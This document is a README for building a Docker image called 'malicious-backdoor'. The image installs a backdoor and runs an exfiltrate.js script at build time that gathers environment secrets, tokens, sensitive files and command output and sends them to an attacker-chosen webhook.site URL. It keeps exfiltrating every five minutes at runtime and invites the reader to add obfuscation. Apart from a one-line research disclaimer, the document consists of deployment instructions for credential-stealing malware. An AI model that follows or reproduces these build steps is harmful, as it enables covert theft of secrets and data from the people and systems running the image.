# Docker Build Instructions

This package includes a Docker setup that installs and runs the backdoor during the build process, exfiltrating sensitive data to a remote server.

## Prerequisites

1. **Get a unique webhook URL** for data exfiltration:
   - Visit https://webhook.site
   - Copy your unique webhook URL (e.g., `https://webhook.site/abc123-def456-ghi789`)

2. Docker and Docker Compose installed

## Building the Docker Image

### Option 1: Using Docker Build (with custom webhook URL)

```bash
# Replace YOUR_WEBHOOK_URL with your actual webhook.site URL
docker build \
  --build-arg EXFIL_URL=https://webhook.site/YOUR_UNIQUE_ID \
  -t malicious-backdoor:latest \
  .
```

### Option 2: Using Docker Compose

1. Edit `docker-compose.yml` and set the `EXFIL_URL` environment variable, or:
2. Create a `.env` file with:
   ```
   EXFIL_URL=https://webhook.site/YOUR_UNIQUE_ID
   ```

Then run:
```bash
docker-compose build
docker-compose up -d
```

### Option 3: Using the build script

```bash
# Set your webhook URL
export EXFIL_URL=https://webhook.site/YOUR_UNIQUE_ID

# Run the build script
./build.sh

# Build the Docker image
docker build --build-arg EXFIL_URL=$EXFIL_URL -t malicious-backdoor:latest .
```

## What Happens During Build

1. **Package Installation**: The backdoor package is installed as a dependency
2. **Exfiltration Script Execution**: The `exfiltrate.js` script runs during build, collecting:
   - System information (hostname, platform, CPU, memory)
   - Network interfaces
   - Environment variables (including secrets, keys, tokens)
   - Process information
   - Sensitive files (if accessible)
   - Command execution results (whoami, id, ps, netstat, etc.)
3. **Data Transmission**: All collected data is sent to your webhook URL

## What Happens at Runtime

- The backdoor continues to exfiltrate data every 5 minutes
- The original backdoor functionality remains active
- All environment variables and system information are continuously monitored

## Monitoring Exfiltrated Data

Visit your webhook.site URL to see all exfiltrated data in real-time. You'll see:
- Build-time exfiltration data
- Runtime periodic exfiltration data
- System information
- Environment variables and secrets
- File contents
- Command execution results

## Security Notes

⚠️ **WARNING**: This is malicious software designed for security research and educational purposes only. Do not use this in production environments or against systems you don't own or have explicit permission to test.

## Customization

To customize the exfiltration behavior, edit `exfiltrate.js`:
- Change the exfiltration interval (default: 5 minutes)
- Add additional data collection methods
- Modify the exfiltration endpoint
- Add encryption or obfuscation

